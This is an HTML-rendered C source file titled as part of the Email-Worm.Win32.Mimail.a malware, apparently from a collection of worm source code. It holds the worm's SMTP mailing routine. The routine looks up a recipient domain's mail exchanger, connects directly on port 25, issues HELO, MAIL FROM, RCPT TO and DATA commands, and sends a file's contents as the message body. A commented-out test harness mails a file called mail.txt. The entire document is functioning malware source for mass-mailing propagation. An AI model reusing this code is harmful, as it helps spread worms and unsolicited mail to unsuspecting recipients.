<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Email-Worm.Win32.Mimail.a - smtp.c.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc7 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc9">#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;
</span><span class="sc2">//#include "my_mx.c"
//#define xfer(m) send(s, m, strlen(m), 0); printf("%s",m);
</span><span class="sc0">
</span><span class="sc1">/*int main(void)
{

    smtp_init();    
    if(smtp_send_file("mail.txt","discoinferno@ehighway.org","discoinferno@ehighway.org","test")){
        printf("Done!\n");
    } else {
        printf("Error!\n");
    }

    WSACleanup();
    return 0;
}*/</span><span class="sc0">

</span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">smtp_send_file</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">fname</span><span class="sc10">,</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">to</span><span class="sc10">,</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">from</span><span class="sc10">,</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">subj</span><span class="sc10">){</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">domain</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">strchr</span><span class="sc10">(</span><span class="sc11">to</span><span class="sc10">,</span><span class="sc7">'@'</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">domain</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">domain</span><span class="sc10">++;</span><span class="sc0">
    </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"Domain: '%s'\n"</span><span class="sc10">,</span><span class="sc11">domain</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">mx</span><span class="sc10">[</span><span class="sc4">256</span><span class="sc10">];</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">get_mx</span><span class="sc10">(</span><span class="sc11">domain</span><span class="sc10">,</span><span class="sc11">mx</span><span class="sc10">,</span><span class="sc4">5000</span><span class="sc10">,</span><span class="sc4">255</span><span class="sc10">)){</span><span class="sc0">
        </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"MX: '%s'\n"</span><span class="sc10">,</span><span class="sc11">mx</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"Lookup failed\n"</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc4">4096</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc11">SOCKET</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">dstaddr</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">hostent</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">he</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">gethostbyname</span><span class="sc10">(</span><span class="sc11">mx</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">he</span><span class="sc10">){</span><span class="sc0">
        </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"hostent() error: %d\n"</span><span class="sc10">,</span><span class="sc11">WSAGetLastError</span><span class="sc10">());</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc11">SOCKADDR_IN</span><span class="sc0"> </span><span class="sc11">anAddr</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">s</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">socket</span><span class="sc10">(</span><span class="sc11">AF_INET</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SOCK_STREAM</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">IPPROTO_TCP</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">!=</span><span class="sc11">INVALID_SOCKET</span><span class="sc10">){</span><span class="sc0">
        </span><span class="sc11">dstaddr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">*((</span><span class="sc16">long</span><span class="sc10">*)</span><span class="sc11">he</span><span class="sc10">-&gt;</span><span class="sc11">h_addr_list</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]);</span><span class="sc0">

        </span><span class="sc11">anAddr</span><span class="sc10">.</span><span class="sc11">sin_family</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">AF_INET</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">anAddr</span><span class="sc10">.</span><span class="sc11">sin_port</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">htons</span><span class="sc10">(</span><span class="sc4">25</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">anAddr</span><span class="sc10">.</span><span class="sc11">sin_addr</span><span class="sc10">.</span><span class="sc11">S_un</span><span class="sc10">.</span><span class="sc11">S_addr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">dstaddr</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">connect</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr</span><span class="sc0"> </span><span class="sc10">*)&amp;</span><span class="sc11">anAddr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">myWait</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">xfer</span><span class="sc10">(</span><span class="sc6">"HELO localhost\r\n"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">myWait</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">closesocket</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc6">"MAIL FROM:&lt;%s&gt;\r\n"</span><span class="sc10">,</span><span class="sc11">from</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">myWait</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">closesocket</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc6">"RCPT TO:&lt;%s&gt;\r\n"</span><span class="sc10">,</span><span class="sc11">to</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">myWait</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">closesocket</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc11">xfer</span><span class="sc10">(</span><span class="sc6">"DATA\r\n"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">myWait</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">closesocket</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szSubj</span><span class="sc10">[</span><span class="sc4">255</span><span class="sc10">];</span><span class="sc0">
            </span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">szSubj</span><span class="sc10">,</span><span class="sc6">"%s %d"</span><span class="sc10">,</span><span class="sc11">subj</span><span class="sc10">,</span><span class="sc11">GetTickCount</span><span class="sc10">());</span><span class="sc0">
            </span><span class="sc11">sprintf</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc6">"From: %s\nTo: &lt;%s&gt;\nReply-To: &lt;%s&gt;\nSubject: %s\n\n"</span><span class="sc10">,</span><span class="sc11">from</span><span class="sc10">,</span><span class="sc11">to</span><span class="sc10">,</span><span class="sc11">from</span><span class="sc10">,</span><span class="sc11">szSubj</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">xfer</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">bytesRead</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">buf2</span><span class="sc10">;</span><span class="sc0">

            </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hFile</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">CreateFile</span><span class="sc10">(</span><span class="sc11">fname</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">GENERIC_READ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FILE_SHARE_READ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">OPEN_EXISTING</span><span class="sc10">,</span><span class="sc0"> \
                </span><span class="sc11">FILE_ATTRIBUTE_NORMAL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">hFile</span><span class="sc10">){</span><span class="sc0">
                </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">ReadFile</span><span class="sc10">(</span><span class="sc11">hFile</span><span class="sc10">,&amp;</span><span class="sc11">buf2</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">,&amp;</span><span class="sc11">bytesRead</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">)){</span><span class="sc0">
                    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">bytesRead</span><span class="sc10">==</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,&amp;</span><span class="sc11">buf2</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">hFile</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc11">xfer</span><span class="sc10">(</span><span class="sc6">"\r\n.\r\n"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">myWait</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">closesocket</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc11">xfer</span><span class="sc10">(</span><span class="sc6">"QUIT\r\n"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">myWait</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">closesocket</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"Failed to connect: '%s'\n"</span><span class="sc10">,</span><span class="sc11">mx</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">closesocket</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0">    
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/*int myWait(SOCKET s){
    FD_SET test;
    TIMEVAL myTime;
    int canRead;
    char buf3[1024] = { 0 };
    int i = 0;
    int j = 0;
    char *p1 = buf3;
    test.fd_count = 1;
    test.fd_array[0] = s;
    myTime.tv_sec = 3;
    myTime.tv_usec = 0;

    do {
        j = recv(s,p1,1,0);
        canRead = select(0, &amp;test, NULL, NULL, &amp;myTime);

        p1++; i++;
    } while(j!=0 &amp;&amp; canRead);
    *p1 = 0;

    printf("%s",buf3);

    if(strncmp(buf3,"250",3)==0 || strncmp(buf3,"220",3)==0 ||
        strncmp(buf3,"354",3)==0 || strncmp(buf3,"221",3)==0){
        return 0;
    }

    printf("ERROR! %s\n",buf3);
    return 1;
}*/</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">smtp_init</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">){</span><span class="sc0">
    </span><span class="sc11">WSADATA</span><span class="sc0"> </span><span class="sc11">wsaData</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">WSAStartup</span><span class="sc10">(</span><span class="sc11">MAKEWORD</span><span class="sc10">(</span><span class="sc4">2</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">wsaData</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span></div></body>
</html>
